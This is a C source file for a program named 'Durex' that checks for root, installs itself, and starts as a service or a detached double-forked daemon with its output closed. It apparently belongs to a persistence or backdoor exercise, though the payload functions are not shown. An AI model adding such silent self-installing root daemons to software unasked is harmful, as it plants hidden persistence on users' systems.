#include "durex.h"

int		build_status(void)
{
	char* process[] = { "Durex", NULL };

	if (processes_exists((char**)&process[0]) == true)
		return (1);
	return (0);
}

int		build_pid(void)
{
	char* process[] = { "Durex", NULL };

	int pid = processes_exists_pid((char**)&process[0]);

	printf("%d\n", pid);
	if (pid != -1)
		return (1);
	return (0);
}

int		build_version(void)
{
	printf("Durex Ver 1.0.0, for debian-linux-gnu (x86_64)\n");
	return (0);
}

const char *get_login()
{
	uid_t uid = geteuid();
	struct passwd *pw = getpwuid(uid);
	if (pw)
	{
		return pw->pw_name;
	}
	return "";
}

int		start_daemon(int argc, char **argv)
{
	(void)argc;
	pid_t	pid = fork();
	if (pid == 0) {
		int sid = setsid();
		if (sid > 0) {
			pid_t new_pid = fork();
			if (new_pid == 0) {
				durex_daemon(argv[0]);
			} else if (new_pid > 0) {
				exit(0);
			}
		} else {
			exit(-1);
		}
	} else if (pid < 0) {
		return (-1);
	}
	return (0);
}

int		start_service(int argc, char **argv)
{
	(void)argc;
	(void)argv;
	char *const args[] = {"/usr/sbin/service", "Durex", "start", NULL};
	char *const env[] = { NULL };

	if (fork() == 0) {
		close(0);
		close(1);
		close(2);
		execve(args[0], args, env);
		exit(0);
	}
	return (0);
}

int		build_daemon(int argc, char **argv)
{
	BOOLEAN silence = false;

	for (int i = 1; i < argc; i++)
	{
		if (strcmp(argv[i], "status") == 0)
			return (build_status());
		if (strcmp(argv[i], "pid") == 0)
			return (build_pid());
		if (strcmp(argv[i], "version") == 0)
			return (build_version());
		if (strcmp(argv[i], " ") == 0)
			silence = true;
	}
	if (silence == false)
		printf("%s\n", get_login());
	daemon_install();
	if (build_status() == 1)
		return (0);
	if (strcmp(argv[0], "/usr/bin/Durex") != 0)
	{
		return (start_service(argc, argv));
	}
	return (start_daemon(argc, argv));
}

int		has_root_rights(void)
{
	if (getuid() == 0)
		return (1);
	printf("Not root: %s\n", get_login());
	return (0);
}

int	main(int argc, char **argv)
{
	if (has_root_rights() == 0)
		return (0);
	return (build_daemon(argc, argv));
	return (0);
}
